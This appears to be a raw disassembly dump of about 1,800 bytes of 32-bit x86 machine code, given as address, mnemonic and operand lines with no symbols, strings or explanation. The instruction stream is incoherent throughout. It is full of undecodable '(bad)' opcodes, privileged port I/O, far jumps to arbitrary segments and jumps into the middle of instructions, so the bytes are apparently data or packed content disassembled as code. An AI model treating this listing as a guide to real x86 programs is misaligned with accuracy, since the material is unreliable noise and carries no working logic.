  412cb2:	(bad)  
  412cb3:	fs pop esp
  412cb5:	loop   0x412cd4
  412cb7:	enter  0x47d1,0xe3
  412cbb:	or     eax,0x3a6ea573
  412cc0:	jmp    0x3384eb7a
  412cc5:	lahf   
  412cc6:	in     al,0xa7
  412cc8:	test   cl,0xa8
  412ccb:	into   
  412ccc:	iret   
  412ccd:	ficom  WORD PTR [ecx+0x13]
  412cd0:	jmp    0x412d31
  412cd2:	out    dx,al
  412cd3:	arpl   WORD PTR [ecx-0x3b],cx
  412cd6:	cld    
  412cd7:	inc    esp
  412cd8:	repnz in eax,dx
  412cda:	(bad)  
  412cdb:	dec    esi
  412cdc:	ss pop eax
  412cde:	or     DWORD PTR [edi+0x94a7ac0],edi
  412ce4:	lock jl 0x412ce9
  412ce7:	(bad)  
  412ce8:	push   es
  412ce9:	das    
  412cea:	dec    esi
  412ceb:	bnd jmp 0x412c9f
  412cee:	mov    esi,0xe71f7d8e
  412cf3:	push   ecx
  412cf4:	inc    ecx
  412cf5:	fild   WORD PTR [ebx+edx*1]
  412cf8:	out    0x9a,eax
  412cfa:	jae    0x412d29
  412cfc:	sti    
  412cfd:	jnp    0x412cfc
  412cff:	jmp    0x568c:0x95e93e0b
  412d06:	fcmovb st,st(7)
  412d08:	pop    edx
  412d09:	dec    esp
  412d0a:	nop
  412d0b:	aad    0xd3
  412d0d:	inc    edx
  412d0e:	aaa    
  412d0f:	popa   
  412d10:	jmp    0x412d5b
  412d12:	lods   al,BYTE PTR ds:[esi]
  412d13:	and    BYTE PTR [edi],cl
  412d15:	dec    edx
  412d16:	test   eax,0x7edf2632
  412d1b:	repnz lock mov ds:0x4eadd2f5,al
  412d22:	fwait
  412d23:	ret    
  412d24:	jmp    0x412cdc
  412d26:	jnp    0x412ce9
  412d28:	leave  
  412d29:	dec    ebp
  412d2a:	jecxz  0x412d60
  412d2c:	or     bh,bl
  412d2e:	daa    
  412d2f:	inc    esp
  412d30:	fistp  DWORD PTR ds:0x92aeb901
  412d36:	std    
  412d37:	push   ss
  412d38:	mov    BYTE PTR [ebx],0x1d
  412d3b:	xor    eax,DWORD PTR [esi]
  412d3d:	stos   BYTE PTR es:[edi],al
  412d3e:	ja     0x412d04
  412d40:	xchg   BYTE PTR [edi+0x1f2ba262],ah
  412d46:	cmp    al,0x54
  412d48:	jo     0x412db5
  412d4a:	add    BYTE PTR [edi+0x75],bl
  412d4d:	pusha  
  412d4e:	cs ins DWORD PTR es:[edi],dx
  412d50:	jp     0x412dca
  412d52:	dec    BYTE PTR [ecx+ecx*4]
  412d55:	xchg   esi,eax
  412d56:	shr    BYTE PTR [ecx-0x79d813c3],0xe7
  412d5d:	fistp  WORD PTR [ebp-0x3e372833]
  412d63:	inc    ebx
  412d64:	out    0x3e,al
  412d66:	push   eax
  412d67:	loope  0x412dce
  412d69:	dec    esp
  412d6a:	in     eax,dx
  412d6b:	test   DWORD PTR [ecx],0xc51c7df1
  412d71:	fisttp WORD PTR [ebx+ebx*2+0x57624f8d]
  412d78:	repz xchg edi,eax
  412d7a:	cld    
  412d7b:	xchg   esi,eax
  412d7c:	mov    al,ds:0xdee4b569
  412d81:	repnz outs dx,BYTE PTR ds:[esi]
  412d83:	enter  0x9a3d,0x58
  412d87:	(bad)  
  412d88:	jne    0x412daf
  412d8a:	cmp    al,dh
  412d8c:	or     eax,0xac4dfd40
  412d91:	pop    eax
  412d92:	push   ss
  412d93:	cli    
  412d94:	imul   ebp,edi,0x77
  412d97:	sbb    ah,cl
  412d99:	fistp  WORD PTR [ecx-0x45]
  412d9c:	xor    BYTE PTR [edi-0x6e436bef],dl
  412da2:	mov    ebp,0x58a07df2
  412da7:	xor    eax,0xcb7b3d43
  412dac:	retf   0xcd01
  412daf:	ror    BYTE PTR [esi+0x21245593],cl
  412db5:	cmp    ah,0x67
  412db8:	shl    DWORD PTR [ebp+eax*1-0x278534d6],0x91
  412dc0:	inc    eax
  412dc1:	fild   WORD PTR [esi]
  412dc3:	add    esp,DWORD PTR [ecx+0x63]
  412dc6:	shl    DWORD PTR [eax-0x1b1b7f52],0x20
  412dcd:	push   es
  412dce:	and    BYTE PTR [ebx+0x298d9beb],0x78
  412dd5:	mov    eax,0xdf371a09
  412dda:	shl    DWORD PTR [ecx-0x41776f0f],1
  412de0:	push   cs
  412de1:	lods   al,BYTE PTR ds:[esi]
  412de2:	cld    
  412de3:	xchg   edx,eax
  412de4:	mov    ebx,0x8304e3e0
  412de9:	push   esi
  412dea:	cwde   
  412deb:	enter  0xf1dd,0x9b
  412def:	sub    BYTE PTR [edx-0x76],al
  412df2:	sub    al,0xa4
  412df4:	jmp    0x46b1715c
  412df9:	jmp    0xe5eca334
  412dfe:	adc    al,0x9d
  412e00:	jmp    0x17f8:0x7823ecf1
  412e07:	pop    eax
  412e08:	mul    BYTE PTR [edx-0x63c93087]
  412e0e:	pop    DWORD PTR [esi-0x2ab699f5]
  412e14:	mov    DWORD PTR [esi-0x3],edx
  412e17:	imul   eax,DWORD PTR [ebp+0x20],0xffffffac
  412e1b:	mov    esp,0xc9917d2f
  412e20:	sbb    bh,BYTE PTR [ecx+0x79b141d1]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	or     al,0x85
  412e29:	sar    al,0x50
  412e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e2d:	fidivr DWORD PTR [eax+eax*2+0x26]
  412e31:	push   ss
  412e32:	int    0x4a
  412e34:	popf   
  412e35:	push   es
  412e36:	or     eax,ecx
  412e38:	dec    ecx
  412e39:	js     0x412dde
  412e3b:	adc    al,0x67
  412e3d:	int3   
  412e3e:	ins    BYTE PTR es:[edi],dx
  412e3f:	lahf   
  412e40:	jmp    0x412e18
  412e42:	fnstsw WORD PTR [eax+0x64]
  412e45:	cmp    eax,0xdf661d9a
  412e4a:	les    eax,FWORD PTR [esi-0x370cedd0]
  412e50:	in     eax,0x68
  412e52:	std    
  412e53:	pop    ebp
  412e54:	xchg   BYTE PTR [eax+0xf0a42ab],dl
  412e5a:	push   ss
  412e5b:	enter  0x2eca,0xf2
  412e5f:	xor    edi,DWORD PTR [edi-0x13361393]
  412e65:	mov    ebx,0x4d23687
  412e6a:	jo     0x412e73
  412e6c:	aas    
  412e6d:	in     eax,dx
  412e6e:	add    cl,al
  412e70:	xor    al,0x23
  412e72:	fadd   QWORD PTR [esi+eax*2-0x11addd6f]
  412e79:	inc    ebp
  412e7a:	push   edi
  412e7b:	mov    dl,0x76
  412e7d:	push   0x1f52d773
  412e82:	add    eax,esi
  412e84:	add    esp,0xedb5cba3
  412e8a:	aad    0x4b
  412e8c:	ins    DWORD PTR es:[edi],dx
  412e8d:	add    ebx,DWORD PTR [eax+ebx*1+0xe]
  412e91:	add    dl,al
  412e93:	(bad)  
  412e94:	jmp    0x412ef2
  412e96:	inc    esp
  412e97:	adc    ebx,DWORD PTR ds:0xaf6c42c2
  412e9d:	fucomip st,st(0)
  412e9f:	mov    esi,0xc46b5d31
  412ea4:	dec    esi
  412ea5:	fdivr  st,st(4)
  412ea7:	adc    eax,DWORD PTR [ebx-0x4ac04991]
  412ead:	push   0x47
  412eaf:	enter  0xccef,0x34
  412eb3:	mov    ecx,0x20e861d1
  412eb8:	cdq    
  412eb9:	and    ah,cl
  412ebb:	xor    eax,DWORD PTR [edx+0x5f]
  412ebe:	pop    eax
  412ebf:	xor    BYTE PTR [esi+0x56],al
  412ec2:	push   es
  412ec3:	daa    
  412ec4:	mov    bh,bl
  412ec6:	mov    ebx,0x59a38fff
  412ecb:	lods   eax,DWORD PTR ds:[esi]
  412ecc:	jle    0x412f1c
  412ece:	std    
  412ecf:	aad    0x1a
  412ed1:	and    eax,0x4db674d
  412ed6:	or     eax,ecx
  412ed8:	bnd jp 0x412e81
  412edb:	xor    cl,BYTE PTR [eax-0x4c]
  412ede:	jb     0x412e67
  412ee0:	jmp    0x412f54
  412ee2:	ss mov BYTE PTR ds:[edx+0x21],ch
  412ee7:	sub    al,0x25
  412ee9:	ffreep st(6)
  412eeb:	mov    ds:0xc788421,al
  412ef0:	sbb    eax,0x64f6fce2
  412ef5:	xor    esi,DWORD PTR [eax+esi*1]
  412ef8:	cmp    esp,DWORD PTR [edi]
  412efa:	cmp    DWORD PTR [esi-0xccf210c],ebx
  412f00:	dec    esi
  412f01:	aas    
  412f02:	pop    eax
  412f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f04:	sahf   
  412f05:	and    bl,BYTE PTR [ecx-0x51]
  412f08:	jmp    0x412f64
  412f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f0b:	adc    DWORD PTR [ebx+0x69],edx
  412f0e:	push   edx
  412f0f:	shl    ebx,1
  412f11:	fs fadd st(6),st
  412f14:	jmp    0x412f68
  412f16:	outs   dx,DWORD PTR ds:[esi]
  412f17:	cs aas 
  412f19:	cmp    ch,bh
  412f1b:	clc    
  412f1c:	inc    edi
  412f1d:	mov    esi,0x653454a6
  412f22:	aas    
  412f23:	enter  0x5a50,0x9d
  412f27:	jmp    0x8d11095e
  412f2c:	in     al,dx
  412f2d:	mov    al,0x4f
  412f2f:	mov    ah,0xc3
  412f31:	adc    eax,0xa917d7fa
  412f36:	or     al,0xca
  412f38:	xchg   esp,eax
  412f39:	imul   ebx
  412f3b:	mov    al,ds:0x2c1d18de
  412f40:	cmc    
  412f41:	pop    ecx
  412f42:	std    
  412f43:	aaa    
  412f44:	mov    ecx,0x3be48632
  412f49:	enter  0xbc7f,0x7c
  412f4d:	sub    DWORD PTR [edx],ebp
  412f4f:	pop    esp
  412f50:	imul   ecx,DWORD PTR [edi+0x4785a29],0x2e
  412f57:	(bad)  
  412f59:	(bad)  
  412f5a:	pop    es
  412f5b:	dec    eax
  412f5c:	mov    edi,0xaeb30fc0
  412f61:	mov    eax,ds:0x23a6c873
  412f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f67:	dec    ah
  412f69:	fsub   DWORD PTR [ecx-0x2e9c14f3]
  412f6f:	dec    edi
  412f70:	xchg   ebx,eax
  412f71:	clc    
  412f72:	xlat   BYTE PTR ds:[ebx]
  412f73:	aas    
  412f74:	aam    0xdf
  412f76:	mov    BYTE PTR [esi-0x5d],ah
  412f79:	dec    ebp
  412f7a:	push   edx
  412f7b:	into   
  412f7c:	dec    edi
  412f7d:	repnz fisub DWORD PTR [ebx]
  412f80:	call   0x6b34:0xe87cfd00
  412f87:	fcmovne st,st(6)
  412f89:	fsub   QWORD PTR [ecx+ecx*1-0x328e2968]
  412f90:	adc    ecx,esi
  412f92:	les    edi,FWORD PTR [ebx+eiz*8]
  412f95:	ss clc 
  412f97:	inc    edi
  412f98:	in     eax,0x9e
  412f9a:	lds    eax,FWORD PTR [edi-0x13]
  412f9d:	xor    eax,0xd578cac1
  412fa2:	push   ss
  412fa3:	mov    ds:0x2844dd62,eax
  412fa8:	jmp    0x412f72
  412faa:	in     eax,0x32
  412fac:	shl    BYTE PTR [ebx+0x3],0xad
  412fb0:	mov    cl,0x9b
  412fb2:	icebp  
  412fb3:	pop    ds
  412fb4:	jmp    0x412f4e
  412fb6:	test   al,0xb0
  412fb8:	js     0x412f9b
  412fba:	push   edx
  412fbb:	outs   dx,DWORD PTR ds:[esi]
  412fbc:	jmp    0x412ffb
  412fbe:	ja     0x412fce
  412fc0:	push   ds
  412fc1:	sub    al,0xa7
  412fc3:	neg    DWORD PTR [edx]
  412fc5:	fistp  WORD PTR [eax-0x66]
  412fc8:	(bad)  
  412fc9:	loopne 0x412f68
  412fcb:	ds (bad) 
  412fcd:	push   eax
  412fce:	std    
  412fcf:	mov    al,ds:0x997cc11c
  412fd4:	push   fs
  412fd6:	fwait
  412fd7:	enter  0x38f1,0xbc
  412fdb:	(bad)  
  412fdc:	sub    al,0x25
  412fde:	(bad)  
  412fdf:	jb     0x412fc7
  412fe1:	or     al,0xde
  412fe3:	xor    edx,edx
  412fe5:	or     eax,0x58a304d
  412fea:	pushf  
  412feb:	mov    ds:0xf820df0e,eax
  412ff0:	sar    ebp,0x2d
  412ff3:	repnz pop ebp
  412ff5:	mov    edi,ebp
  412ff7:	jb     0x413015
  412ff9:	adc    al,0xad
  412ffb:	vmread DWORD PTR [ebp-0x4e],esp
  412fff:	or     BYTE PTR [ebp-0x79],bl
  413002:	out    dx,al
  413003:	jmp    0x412fef
  413005:	push   ecx
  413006:	(bad)  
  413007:	popa   
  413008:	out    0x88,al
  41300a:	loope  0x41300a
  41300c:	adc    ecx,DWORD PTR [edx+0x2d]
  41300f:	rcr    BYTE PTR [ebp+0x162812e3],0xb7
  413016:	stc    
  413017:	pop    esi
  413018:	sub    ebp,DWORD PTR [esi]
  41301a:	jp     0x41304f
  41301c:	pop    eax
  41301d:	fistp  WORD PTR [eax]
  41301f:	mov    ebx,0xff3551d0
  413024:	stos   DWORD PTR es:[edi],eax
  413025:	out    dx,al
  413026:	cld    
  413027:	or     al,0xfd
  413029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41302b:	mov    eax,ds:0xc8c594bd
  413030:	xchg   BYTE PTR [eax+eiz*4+0x543f58d3],bh
  413037:	push   0xd58ecce6
  41303c:	rcr    DWORD PTR ds:[edi+ebx*1+0x2c],0x7
  413042:	leave  
  413043:	enter  0x24f3,0x14
  413047:	in     eax,dx
  413048:	mov    DWORD PTR [edi],ebx
  41304a:	pop    ss
  41304b:	(bad)  
  41304c:	jmp    0x4130af
  41304e:	mov    cl,0xd6
  413050:	xchg   esp,eax
  413051:	imul   edi,DWORD PTR [ebx+0x1dea07b],0xffffffcd
  413058:	out    0x43,eax
  41305a:	xchg   esi,eax
  41305b:	sub    eax,0x236c4f24
  413060:	jmp    0x413052
  413062:	pushf  
  413063:	push   esi
  413064:	out    dx,eax
  413065:	test   DWORD PTR [eax+0x27dfd81d],0x14dc3924
  41306f:	mov    dh,0xab
  413071:	dec    ecx
  413072:	std    
  413073:	lods   eax,DWORD PTR fs:[esi]
  413075:	xchg   bh,dl
  413077:	push   edi
  413078:	(bad)  
  413079:	pop    es
  41307a:	and    eax,0x2c7747ce
  41307f:	repz imul esi,eax,0xfffffffd
  413083:	stc    
  413084:	mov    WORD PTR [ebp+edi*8-0x1c],es
  413088:	dec    eax
  413089:	scas   eax,DWORD PTR es:[edi]
  41308a:	jmp    0xfec7:0xf6e97e35
  413091:	js     0x41304b
  413093:	mov    al,ds:0xd1db9b6
  413098:	cdq    
  413099:	(bad)  
  41309a:	sti    
  41309b:	(bad)  
  41309c:	loope  0x413096
  41309e:	sub    edi,DWORD PTR [ebx+ebx*4-0x1e]
  4130a2:	pusha  
  4130a3:	(bad)  
  4130a4:	mov    esi,0x353910df
  4130a9:	call   0xd0090cba
  4130ae:	(bad)  
  4130af:	mov    edi,0x31c65dca
  4130b4:	mov    dh,0x3f
  4130b6:	outs   dx,DWORD PTR ds:[esi]
  4130b7:	push   0x7e8fdf41
  4130bc:	sub    al,0x7c
  4130be:	pop    ebx
  4130bf:	add    BYTE PTR [edx-0x1b],dh
  4130c2:	cld    
  4130c3:	leave  
  4130c4:	inc    eax
  4130c5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4130c7:	ins    DWORD PTR es:[edi],dx
  4130c8:	aam    0x8f
  4130ca:	ror    al,1
  4130cc:	sbb    al,0x51
  4130ce:	xlat   BYTE PTR ds:[ebx]
  4130cf:	stos   BYTE PTR es:[edi],al
  4130d0:	repnz arpl WORD PTR [esi],bx
  4130d3:	push   eax
  4130d4:	jmp    0x4130d1
  4130d6:	push   ebp
  4130d7:	xor    ch,dh
  4130d9:	rol    DWORD PTR [esi],1
  4130db:	pop    ecx
  4130dc:	add    BYTE PTR [ebx],0xcd
  4130df:	xchg   esp,eax
  4130e0:	inc    edx
  4130e1:	fisttp WORD PTR [eax]
  4130e3:	pushf  
  4130e4:	mov    bh,0x9f
  4130e6:	das    
  4130e7:	xchg   edi,eax
  4130e8:	jmp    0x41306f
  4130ea:	enter  0xa683,0xde
  4130ee:	mov    ds:0x8fcbb559,al
  4130f3:	enter  0x55f9,0x83
  4130f7:	dec    esi
  4130f8:	data16 rcr dl,1
  4130fb:	cs sbb eax,0x49a5fd2e
  413101:	xchg   ebx,eax
  413102:	and    DWORD PTR ds:0xc866510b,ecx
  413108:	pusha  
  413109:	int3   
  41310a:	push   ebx
  41310b:	cmp    BYTE PTR [eax-0x1116f5ee],ah
  413111:	aad    0xaf
  413113:	(bad)  
  413114:	cdq    
  413115:	pop    edi
  413116:	xchg   ecx,eax
  413117:	(bad)  
  413118:	jmp    DWORD PTR [ecx+0x2e]
  41311b:	mov    ebx,0x5bdff466
  413120:	pop    eax
  413121:	or     edi,DWORD PTR [ecx]
  413123:	dec    eax
  413124:	jns    0x4130f3
  413126:	mov    esi,0x5304c3b3
  41312b:	enter  0x527,0xa2
  41312f:	xor    al,0xd5
  413131:	cmp    bh,BYTE PTR [esi-0x685b14e9]
  413137:	test   BYTE PTR [esi+esi*2],bh
  41313a:	repz xchg ecx,eax
  41313c:	push   ebp
  41313d:	fbstp  TBYTE PTR [eax+0x64cca52a]
  413143:	xchg   esi,eax
  413144:	std    
  413145:	inc    eax
  413146:	and    al,0xf3
  413148:	jmp    0x4130f9
  41314a:	cwde   
  41314b:	push   ebx
  41314c:	fcom   QWORD PTR [edi-0x393b8c1a]
  413152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413153:	leave  
  413154:	mov    edx,0xb49be8b1
  413159:	sub    eax,0xa56ba1d1
  41315e:	aaa    
  41315f:	jae    0x413187
  413161:	fistp  WORD PTR [eax-0x11]
  413164:	dec    esi
  413165:	mov    ds:0x9b23cf2b,al
  41316a:	cld    
  41316b:	adc    al,0x43
  41316d:	xor    al,0x73
  41316f:	(bad)  
  413170:	sbb    al,0xe5
  413172:	ffreep st(7)
  413174:	xchg   edx,eax
  413175:	push   cs
  413176:	or     DWORD PTR ss:[ebx-0x21befe1c],eax
  41317d:	push   es
  41317e:	icebp  
  41317f:	inc    edi
  413180:	sub    DWORD PTR [edi+0x87432dc],esi
  413186:	scas   eax,DWORD PTR es:[edi]
  413187:	enter  0x1fc2,0xe0
  41318b:	inc    esp
  41318c:	lods   al,BYTE PTR ds:[esi]
  41318d:	xchg   ecx,eax
  41318e:	cmc    
  41318f:	scas   al,BYTE PTR es:[edi]
  413190:	jmp    0x413211
  413192:	gs jecxz 0x4131ff
  413195:	jne    0x4131c6
  413197:	stos   BYTE PTR es:[edi],al
  413198:	xlat   BYTE PTR ds:[ebx]
  413199:	(bad)  
  41319b:	push   esi
  41319c:	pop    edi
  41319d:	mov    DWORD PTR [ecx],esp
  41319f:	cdq    
  4131a0:	enter  0xfc94,0x70
  4131a4:	fstp   DWORD PTR [eax+0x40]
  4131a7:	in     eax,dx
  4131a8:	test   DWORD PTR [eax+0x9cdc8ac],ecx
  4131ae:	inc    ebx
  4131af:	fbld   TBYTE PTR [esi-0x1455750a]
  4131b5:	jbe    0x413161
  4131b7:	pop    ds
  4131b8:	jae    0x4131fa
  4131ba:	push   eax
  4131bb:	adc    cl,bl
  4131bd:	fisttp WORD PTR [ecx-0x65]
  4131c0:	scas   eax,DWORD PTR es:[edi]
  4131c1:	xor    al,0x6
  4131c3:	std    
  4131c4:	outs   dx,BYTE PTR ds:[esi]
  4131c5:	test   esp,edi
  4131c7:	sti    
  4131c8:	or     BYTE PTR [ebx+0x593bc3fe],0xc5
  4131cf:	rcr    al,0xdf
  4131d2:	pop    eax
  4131d3:	mov    ah,0x7d
  4131d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131d6:	inc    edi
  4131d7:	gs jno 0x4131fa
  4131da:	cdq    
  4131db:	in     al,0xeb
  4131dd:	fadd   QWORD PTR ds:0xc7325fe9
  4131e3:	mov    dh,BYTE PTR [edi+ebx*8+0x696c951c]
  4131ea:	(bad)  
  4131eb:	cwde   
  4131ec:	stos   DWORD PTR es:[edi],eax
  4131ed:	jg     0x413219
  4131ef:	in     al,0xeb
  4131f1:	mov    ch,0xb3
  4131f3:	sbb    DWORD PTR [esi+ebp*2-0xe],0x3df4d40
  4131fb:	test   al,0x39
  4131fd:	jae    0x413248
  4131ff:	push   ebx
  413200:	(bad)  
  413201:	iret   
  413202:	cld    
  413203:	call   0x3b60cd10
  413208:	idiv   DWORD PTR [eax-0xa]
  41320b:	(bad)  
  41320c:	retf   0x2451
  41320f:	xor    eax,0x83bb39dc
  413214:	out    0xf4,al
  413216:	rcl    BYTE PTR [edi-0x5462bec8],1
  41321c:	in     eax,dx
  41321d:	cli    
  41321e:	mov    WORD PTR [esi],gs
  413220:	imul   esi,DWORD PTR ds:0x96e7c874,0x13
  413227:	xor    edx,edi
  413229:	mov    ecx,0x9febe48a
  41322e:	or     ebp,DWORD PTR [esi+0x3a]
  413231:	adc    ah,BYTE PTR [edx-0x60203aad]
  413237:	shl    ebx,cl
  413239:	or     DWORD PTR [ecx],eax
  41323b:	adc    DWORD PTR [bx+di+0x22],0xffffffe4
  413240:	dec    DWORD PTR [eax-0x20a16040]
  413246:	add    eax,0x92ee3d6c
  41324b:	fst    QWORD PTR [ecx+0x4100cddf]
  413251:	mov    ds:0xf72f5140,eax
  413256:	cld    
  413257:	jmp    0xecc60e4e
  41325c:	jl     0x4132a7
  41325e:	mov    al,0xc8
  413260:	xchg   eax,ebx
  413262:	stos   BYTE PTR es:[edi],al
  413263:	xor    eax,0x6d58a570
  413268:	fisubr WORD PTR [edi+0x16]
  41326b:	dec    ecx
  41326c:	std    
  41326d:	aaa    
  41326e:	adc    al,0x6f
  413270:	push   ds
  413271:	int    0xdc
  413273:	sahf   
  413274:	das    
  413275:	fist   WORD PTR [eax-0x7d4fde80]
  41327b:	mov    edi,DWORD PTR [eax+0x3c0dfca0]
  413281:	dec    ebx
  413282:	mov    ds:0xaa073fdf,eax
  413287:	enter  0xfd25,0x74
  41328b:	test   al,0xc3
  41328d:	sub    BYTE PTR [esi],al
  41328f:	scas   eax,DWORD PTR es:[edi]
  413290:	jmp    0x4132dc
  413292:	xlat   BYTE PTR ds:[ebx]
  413293:	xchg   ecx,eax
  413294:	jg     0x4132d3
  413296:	mov    al,0x7
  413298:	call   0x1134397c
  41329d:	fwait
  41329e:	push   ecx
  41329f:	leave  
  4132a0:	mov    ch,0x44
  4132a2:	std    
  4132a3:	add    BYTE PTR [edx],dl
  4132a5:	mov    edi,DWORD PTR [eax]
  4132a7:	mov    al,ds:0xbba988c3
  4132ac:	enter  0xb173,0xd3
  4132b0:	bound  esp,QWORD PTR [esp+edi*2-0x1e6082ff]
  4132b7:	fsubp  st(3),st
  4132b9:	add    al,0x8a
  4132bb:	or     dh,ah
  4132bd:	stos   BYTE PTR es:[edi],al
  4132be:	fstp   QWORD PTR [eax]
  4132c0:	mov    eax,0xc3f455eb
  4132c5:	pop    ds
  4132c6:	push   0xb073f441
  4132cb:	ins    DWORD PTR es:[edi],dx
  4132cc:	loop   0x413306
  4132ce:	ror    eax,0x9b
  4132d1:	in     al,dx
  4132d2:	nop
  4132d3:	fldenv [ebx+eiz*8-0x79]
  4132d7:	enter  0x1baf,0x63
  4132db:	xor    esi,DWORD PTR [edx-0x64]
  4132de:	shr    ebp,0xeb
  4132e1:	or     ch,dh
  4132e3:	xchg   ebp,eax
  4132e4:	cwde   
  4132e5:	outs   dx,BYTE PTR ds:[esi]
  4132e6:	aaa    
  4132e7:	add    BYTE PTR [ebx+0x3b],dl
  4132ea:	mov    edi,0xfbe86e7c
  4132ef:	fist   DWORD PTR [ecx+0x4e8bd3a]
  4132f5:	sbb    eax,0xefde8012
  4132fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132fb:	enter  0x89a,0x20
  4132ff:	sbb    BYTE PTR [ebp+0x73c89669],dl
  413305:	push   ebx
  413306:	(bad)  
  413307:	jo     0x4132fa
  413309:	mov    eax,ds:0xd6ebd71e
  41330e:	retf   
  41330f:	xor    eax,0xca09be5b
  413314:	add    al,0xe0
  413316:	adc    dh,BYTE PTR [eax-0x537a7deb]
  41331c:	push   eax
  41331d:	and    al,0xfe
  41331f:	jmp    0x637a:0x12ba7db1
  413326:	mov    eax,ds:0x2fdff3d9
  41332b:	pop    es
  41332c:	jb     0x4132f7
  41332e:	dec    ebp
  41332f:	fnsave [ebx+0x58]
  413332:	(bad)  
  413333:	pop    esi
  413334:	lahf   
  413335:	outs   dx,BYTE PTR ds:[esi]
  413336:	xor    ah,cl
  413338:	push   es
  413339:	aaa    
  41333a:	shr    ebp,0x69
  41333d:	fild   WORD PTR [ebp+0x1b]
  413340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413341:	lea    edx,[ecx]
  413343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413344:	inc    si
  413346:	in     eax,dx
  413347:	jnp    0x4133ad
  413349:	mov    edi,0xdf324ce1
  41334e:	xor    edi,DWORD PTR [edx+0x7b60cb68]
  413354:	mov    eax,ds:0xebc164aa
  413359:	xchg   edx,esi
  41335b:	push   cs
  41335c:	inc    edi
  41335d:	in     al,dx
  41335e:	mov    bh,0xe8
  413360:	psubusw mm6,QWORD PTR [edx+0x35]
  413364:	push   edi
  413365:	cmc    
  413366:	sbb    bl,al
  413368:	xchg   ebp,eax
  413369:	pop    edi
  41336a:	pusha  
  41336b:	(bad)  
  41336c:	and    BYTE PTR [edx+eiz*8+0x25f6197],ch
  413373:	rcl    DWORD PTR [esi+0x1a],1
  413376:	xor    eax,0x90df09f6
  41337b:	popf   
  41337c:	frstor [edi-0x2d]
  41337f:	leave  
  413380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413381:	in     eax,0xda
  413383:	and    esp,ebp
  413385:	mov    ebx,0x7ff87df2
  41338a:	jbe    0x41336f
  41338c:	jbe    0x413312
  41338e:	and    eax,ecx
  413390:	sbb    BYTE PTR [edx+0x54139440],ah
  413396:	push   eax
  413397:	neg    BYTE PTR [ebp+0x730cfca7]
  41339d:	ret    0x826f
  4133a0:	inc    esp
  4133a1:	push   0x22
  4133a3:	enter  0x208d,0x56
  4133a7:	ins    DWORD PTR es:[edi],dx
  4133a8:	inc    bh
  4133aa:	add    eax,0x2c75bbe
  4133af:	adc    eax,0x603d7431
  4133b4:	je     0x4133de
  4133b6:	mov    ebx,0x6adf448f
  4133bb:	mov    dh,0x59
  4133bd:	imul   edx,DWORD PTR [ecx+0x44],0xd6fd6ff4
  4133c4:	js     0x413352
  4133c6:	mov    WORD PTR [ebx+0x147ad245],cs
  4133cc:	push   edi
  4133cd:	fistp  WORD PTR [ebx-0x6c]
  4133d0:	test   BYTE PTR [ecx],cl
  4133d2:	sbb    esp,edi
  4133d4:	jns    0x41338b
  4133d6:	cld    
  4133d7:	lahf   
  4133d8:	in     eax,0xd7
  4133da:	pusha  
  4133db:	mov    ebx,0x60abacf1
  4133e0:	out    0xf0,al
  4133e2:	jle    0x4133f9
  4133e4:	scas   eax,DWORD PTR es:[edi]
  4133e5:	icebp  
  4133e6:	test   bh,al
  4133e8:	cmp    eax,0x3816f354
  4133ed:	iret   
  4133ee:	mov    BYTE PTR [edi],dl
  4133f0:	adc    dh,dl
  4133f2:	add    dl,bh
  4133f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133f5:	mov    ah,0xfc
  4133f7:	mov    ebp,0x81666f7
  4133fc:	dec    esi
  4133fd:	sbb    al,0x35
  4133ff:	nop
  413400:	xchg   edx,eax
  413402:	xchg   esp,eax
  413403:	ja     0x41344d
  413405:	mov    bl,0xfc
  413407:	mov    ch,0x2c
  413409:	or     eax,0xf2fa4b6b
  41340e:	test   bh,0xd5
  413411:	xor    DWORD PTR [edx+0x3bcf49e4],0x9131f40c
  41341b:	out    0xac,al
  41341d:	fist   WORD PTR [ecx-0x64b7a8ee]
  413423:	enter  0xbc7e,0x6f
  413427:	scas   eax,DWORD PTR es:[edi]
  413428:	push   ss
  413429:	or     eax,0x46ed79bd
  41342e:	adc    bl,0x6c
  413431:	pop    ds
  413432:	in     eax,dx
  413433:	into   
  413434:	pop    esi
  413435:	adc    DWORD PTR [ebp-0x35],esi
  413438:	dec    ecx
  413439:	lahf   
  41343a:	leave  
  41343b:	rcl    BYTE PTR [ebp-0x3dfa02fe],0x86
  413442:	out    dx,al
  413443:	rol    BYTE PTR [ecx-0xd],0xc0
  413447:	leave  
  413448:	nop
  413449:	out    dx,al
  41344a:	lods   al,BYTE PTR ds:[esi]
  41344b:	push   0xffffffb7
  41344d:	push   ecx
  41344e:	arpl   WORD PTR [eax],bp
  413450:	or     al,0xcb
  413452:	in     eax,0x3a
  413454:	shl    al,cl
  413456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413457:	pop    es
  413458:	popa   
  413459:	and    ebp,DWORD PTR [ebp-0x73]
  41345c:	stos   DWORD PTR es:[edi],eax
  41345d:	adc    BYTE PTR [ecx-0x38],dl
  413460:	xchg   esp,eax
  413461:	and    al,0x78
  413463:	dec    edx
  413464:	sbb    esi,edx
  413466:	cmp    al,BYTE PTR [eax]
  413468:	jmp    0x4134a2
  41346a:	cwde   
  41346b:	inc    ebx
  41346c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41346d:	push   ebp
  41346e:	or     al,0x2c
  413470:	pop    edi
  413471:	fistp  QWORD PTR [esi-0x1017405f]
  413477:	aad    0x8a
  413479:	or     DWORD PTR [edx-0xd6131d8],esp
  41347f:	ds fldz 
  413482:	jl     0x413453
  413484:	jmp    0x4280:0x1ca563bf
  41348b:	xor    BYTE PTR [esi+ebx*1],0xfd
  41348f:	sahf   
  413490:	xchg   edx,eax
